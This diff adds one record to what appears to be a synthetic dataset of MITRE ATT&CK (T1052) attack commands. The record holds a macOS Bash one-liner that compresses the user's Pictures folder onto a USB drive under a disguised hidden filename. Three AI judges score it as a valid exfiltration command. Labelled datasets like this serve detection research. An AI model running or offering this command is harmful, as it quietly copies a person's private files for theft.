@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/Pictures\" | dd of=\"/Volumes/USB32/.photoindex.db\" bs=4m conv=sync,noerror && sync && diskutil unmount \"/Volumes/USB32\"",
+  "explanation": "Compresses the Pictures folder and writes it to a database-looking file on the external drive using dd, then unmounts for quick removal.",
+  "rationale_steps": [
+    "Aggregate image files into a single compressed stream.",
+    "Write the stream directly to the USB device via dd.",
+    "Name the output to resemble an internal metadata file for camouflage.",
+    "Flush and unmount to complete the offline transfer."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-c5593608",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting and operators with valid tar, dd, sync, and diskutil options for macOS make it fully parseable.",
+        "semantic_score": 5,
+        "semantic_justification": "It tars and gzips the Pictures folder to a hidden, database-like file on an external volume, then syncs and unmounts for physical removal, matching exfiltration over physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T08:57:42.872188Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for both tar and dd commands, correct command separators (|, &&), and appropriate syntax for all components including the final diskutil unmount operation.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1052 (Exfiltration Over Physical Medium) by compressing user photos, writing them to a hidden-looking file on a USB drive with a deceptive filename (.photoindex.db), and properly unmounting the drive for safe physical removal.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T08:57:46.309258Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags, correct command separators, and no impossible constructs.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly achieves the claimed intent by compressing data, writing it to a physical medium with an obfuscated filename, and preparing the medium for quick removal, directly aligning with MITRE ATT&CK T1052's description of staging, packaging, obfuscation, and physical exfiltration.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T08:57:55.154169Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
